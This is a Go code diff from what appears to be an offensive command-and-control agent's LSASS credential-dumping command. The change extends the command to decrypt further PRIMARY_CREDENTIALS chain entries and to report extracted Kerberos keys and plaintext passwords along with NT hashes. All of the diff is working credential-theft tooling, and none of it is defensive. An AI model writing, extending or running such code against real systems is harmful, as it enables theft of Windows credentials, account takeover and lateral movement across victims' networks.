@@ -148,6 +148,8 @@ func executeInsituFullInner() structs.CommandResult {
 	credBlobsCaptured := 0
 	credBlobsDecrypted := 0
 	hashesExtracted := 0
+	kerbKeysExtracted := 0
+	ptCredsExtracted := 0
 	dumpLines := make([]string, 0, 8)
 	for _, n := range nodes {
 		preview := 64
@@ -225,7 +227,9 @@ func executeInsituFullInner() structs.CommandResult {
 					}
 				}
 				for _, c := range creds {
-					credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser, &credBlobsCaptured, &credBlobsDecrypted, &hashesExtracted, &dumpLines)
+					credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser,
+						&credBlobsCaptured, &credBlobsDecrypted, &hashesExtracted,
+						&kerbKeysExtracted, &ptCredsExtracted, &dumpLines)
 					report.Credentials = append(report.Credentials, credReport)
 				}
 			}
@@ -260,6 +264,8 @@ func executeInsituFullInner() structs.CommandResult {
 		CredentialBlobsCaptured:  credBlobsCaptured,
 		CredentialBlobsDecrypted: credBlobsDecrypted,
 		HashesExtracted:          hashesExtracted,
+		KerberosKeysExtracted:    kerbKeysExtracted,
+		PlaintextCredsExtracted:  ptCredsExtracted,
 		UnmatchedLUIDs:           unmatched,
 		Nodes:                    reports,
 	}
@@ -271,7 +277,7 @@ func executeInsituFullInner() structs.CommandResult {
 
 	header := formatInsituFullOutput(phase1, protection, pid, mod, anchor, walkErr, nodes, layout,
 		structParsed, matchedLUIDs, luidsOrdered, nodesWithCreds, credBlobsCaptured,
-		cryptoErrStr, cryptoReport, hashesExtracted, dumpLines)
+		cryptoErrStr, cryptoReport, hashesExtracted, kerbKeysExtracted, ptCredsExtracted, dumpLines)
 	return successResult(header + "\n" + string(jsonBytes))
 }
 
@@ -281,7 +287,8 @@ func executeInsituFullInner() structs.CommandResult {
 // PRIMARY_CREDENTIALS envelope's Primary field is the auth package name, not
 // the user's login name. Counters are updated in-place.
 func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaCryptoMaterial,
-	sessionUser string, blobsCaptured, blobsDecrypted, hashes *int, dumpLines *[]string) insituFullCredentialReport {
+	sessionUser string, blobsCaptured, blobsDecrypted, hashes, kerbKeys, ptCreds *int,
+	dumpLines *[]string) insituFullCredentialReport {
 	credReport := insituFullCredentialReport{
 		Address:       fmt.Sprintf("0x%X", c.Address),
 		AuthPackageId: c.AuthPackageId,
@@ -310,7 +317,9 @@ func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaC
 			*blobsCaptured++
 
 			if canDecrypt {
-				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, sessionUser)
+				credName := c.Primary.UserName
+				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, sessionUser,
+					credName, c.Primary.EncryptedAddress)
 				credReport.Decrypted = dec
 				if dec != nil && dec.ParseErr != "" {
 					credReport.DecryptErr = dec.ParseErr
@@ -319,12 +328,54 @@ func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaC
 					*blobsDecrypted++
 					*hashes++
 				}
+				if dec != nil && len(dec.KerberosKeys) > 0 {
+					*kerbKeys += len(dec.KerberosKeys)
+				}
+				if dec != nil && dec.PlaintextPassword != "" {
+					*ptCreds++
+				}
 				if line != "" {
 					*dumpLines = append(*dumpLines, line)
 				}
 			}
 		}
 		credReport.ParseErrors = c.Primary.ParseErrors
+	}
+
+	// Process additional entries in the PRIMARY_CREDENTIALS chain.
+	if len(c.PrimaryEntries) > 1 && canDecrypt {
+		for _, pe := range c.PrimaryEntries[1:] {
+			entryReport := insituFullPrimaryCredEntryReport{
+				CredentialName: pe.UserName,
+			}
+			if pe.EncryptedAddress != 0 {
+				entryReport.EncryptedAddress = fmt.Sprintf("0x%X", pe.EncryptedAddress)
+			}
+			entryReport.EncryptedLength = pe.EncryptedLength
+			if len(pe.EncryptedBytes) > 0 {
+				*blobsCaptured++
+				dec, line := decryptCredentialBlob(material, pe.EncryptedBytes, sessionUser,
+					pe.UserName, pe.EncryptedAddress)
+				entryReport.Decrypted = dec
+				if dec != nil && dec.ParseErr != "" {
+					entryReport.DecryptErr = dec.ParseErr
+				}
+				if dec != nil && dec.NtHashHex != "" {
+					*blobsDecrypted++
+					*hashes++
+				}
+				if dec != nil && len(dec.KerberosKeys) > 0 {
+					*kerbKeys += len(dec.KerberosKeys)
+				}
+				if dec != nil && dec.PlaintextPassword != "" {
+					*ptCreds++
+				}
+				if line != "" {
+					*dumpLines = append(*dumpLines, line)
+				}
+			}
+			credReport.AdditionalEntries = append(credReport.AdditionalEntries, entryReport)
+		}
 	}
 	return credReport
 }
@@ -337,7 +388,7 @@ func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionSt
 	structParsed int, matchedLUIDs map[uint64]bool, luidsOrdered []uint64,
 	nodesWithCreds, credBlobsCaptured int,
 	cryptoErrStr string, cryptoReport *insituFullCryptoReport,
-	hashesExtracted int, dumpLines []string) string {
+	hashesExtracted, kerbKeysExtracted, ptCredsExtracted int, dumpLines []string) string {
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
@@ -360,8 +411,8 @@ func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionSt
 			cryptoReport.H3DesGlobal, bcryptCbSecret(cryptoReport.H3DesKey),
 			cryptoReport.HAesGlobal, bcryptCbSecret(cryptoReport.HAesKey)))
 	}
-	sb.WriteString(fmt.Sprintf("[+] Decryption: %d blob(s) yielded NT hash(es) (auto-detected layout) — Phase 2C-ii-c\n",
-		hashesExtracted))
+	sb.WriteString(fmt.Sprintf("[+] Decryption: %d NT hash(es), %d Kerberos key(s), %d plaintext credential(s)\n",
+		hashesExtracted, kerbKeysExtracted, ptCredsExtracted))
 
 	if len(dumpLines) > 0 {
 		sb.WriteString("\n")
